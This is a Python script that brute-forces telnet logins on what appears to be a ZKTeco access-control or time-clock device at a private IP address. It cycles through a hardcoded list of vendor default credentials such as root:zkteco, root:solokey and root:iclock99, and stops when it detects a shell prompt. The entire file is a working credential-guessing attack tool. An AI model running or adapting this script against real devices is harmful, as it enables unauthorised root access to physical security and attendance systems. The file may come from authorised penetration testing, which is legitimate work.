#!/usr/bin/env python3
"""ZK telnet brute-force with strict timeouts."""
import socket
import sys
import time

def strip_telnet(data):
    """Strip IAC sequences from telnet data."""
    out = bytearray()
    i = 0
    while i < len(data):
        if data[i] == 0xff and i + 2 < len(data):
            i += 3
        else:
            out.append(data[i])
            i += 1
    return bytes(out)

def recv_until(s, timeout=2):
    s.settimeout(timeout)
    out = b''
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
            if len(out) > 4096:
                break
    except socket.timeout:
        pass
    return strip_telnet(out)

def telnet_try(host, port, user, pwd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8)
    try:
        s.connect((host, port))
        banner = recv_until(s, 2)
        s.send(user.encode() + b'\n')
        time.sleep(0.5)
        data1 = recv_until(s, 1)
        s.send(pwd.encode() + b'\n')
        time.sleep(1)
        data2 = recv_until(s, 2)
        combined = (banner + data1 + data2).decode('utf-8', errors='replace')
        return combined
    finally:
        try: s.close()
        except: pass

combos = [
    ('root', 'solokey'),
    ('root', '123456'),
    ('root', 'iclock99'),
    ('root', ''),
    ('admin', '123456'),
    ('administrator', '123456'),
    ('root', 'toor'),
    ('root', 'mstar'),
    ('root', 'zkteco'),
]

host = '172.16.0.214'
for u, p in combos:
    print(f'\n=== {u}:{p} ===')
    try:
        r = telnet_try(host, 23, u, p)
        # Look for success indicators
        lower = r.lower()
        if 'incorrect' in lower or 'login incorrect' in lower:
            print(f'  REJECTED')
        elif '$ ' in r or '# ' in r or '~' in r:
            print(f'  *** LOGGED IN ***')
            print(r[:300])
            sys.exit(0)
        else:
            # Print last 200 chars to see what we got
            print(f'  Response tail: {r[-200:]!r}')
    except Exception as e:
        print(f'  ERR: {type(e).__name__}: {e}')

print('\nNo creds worked')
